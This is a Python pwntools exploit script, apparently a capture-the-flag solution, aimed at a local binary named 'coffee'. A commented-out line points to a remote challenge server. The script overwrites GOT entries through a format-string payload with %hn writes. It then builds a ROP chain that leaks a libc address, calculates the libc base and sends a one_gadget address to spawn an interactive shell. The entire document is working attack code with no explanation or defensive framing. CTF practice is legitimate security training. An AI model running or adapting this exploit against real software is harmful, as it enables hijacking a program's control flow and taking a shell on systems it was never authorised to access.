from pwn import *

r = process("./coffee")
gdb.attach(r)

# r = remote("34.146.101.4", 30002)


puts_got = 0x404018
printf_got = 0x404028

pop3_ret = 4750
pop_rdi_ret = 0x0000000000401293
printf = 0x401090
puts_real = 0x401030
pop_rsi_r15_ret = 0x0000000000401291
scanf = 0x4010a0
pop4_ret = 0x000000000040128c
puts = 0x401070
scanf_arg = 0x402004
ret = 0x000000000040101a
main = 0x401196

bssaddr = 0x00404130
pop5_ret = 0x40128b


payload = b'%4747x' + b'%20$hn'
payload += b'%24730x' + b'%21$hn'
payload += b'a'*(32-len(payload))  


payload += p64(pop_rdi_ret) + p64(printf_got) + p64(puts_real)
payload += p64(pop_rdi_ret) + p64(bssaddr)
payload += p64(pop_rsi_r15_ret) + p64(puts_got) + p64(0) 
payload += p64(scanf)

payload += p64(puts)
payload += p64(puts_got)
payload += p64(bssaddr)

r.sendline(payload)

printf_off = 0x0000000000064e10

stuff = r.recvuntil(b'\x7f')[-6:]

libc_base = int.from_bytes(stuff, 'little') - printf_off

print(hex(libc_base))

one_gadget = 0xe6c81 + libc_base

r.sendline(p64(one_gadget))



r.interactive()